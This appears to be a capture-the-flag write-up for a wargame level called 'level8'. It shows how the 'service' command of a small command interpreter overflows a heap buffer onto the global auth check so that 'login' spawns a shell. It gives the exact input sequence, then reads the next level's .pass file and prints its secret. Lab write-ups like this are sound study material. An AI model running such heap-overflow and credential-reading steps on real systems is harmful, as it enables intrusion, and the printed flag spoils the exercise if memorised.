We proceed to disas the main and reassemble the program to get our source code.

As we can observe in the source.c, it's a command interpretter. There's 4 command:
"auth ",
"service",
"reset",
"login"

We can see that after the "login" command, there's a call to /bin/sh but we need to pass a security first.
This security is a check on the global variable %auth
to see if its 9th character is a '\0'.

Thanks to the "service" command which strdup our input into the global variable %service
we'll be able to overwrite the content of %auth
which is first initialized with '\0' after the command "auth "

So first, we initialize %auth
$ ./level8
=> (nil), (nil) 
$ "auth "
=> 0x804a008, (nil) 
Then we use "service" to overflow on %auth
$ service123456789123456789123456789123456789
=> 0x804a008, 0x804a018 
and then we use "login"
$ login
And we got the shell prompt:
$ cat /home/user/level9/.pass
=> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
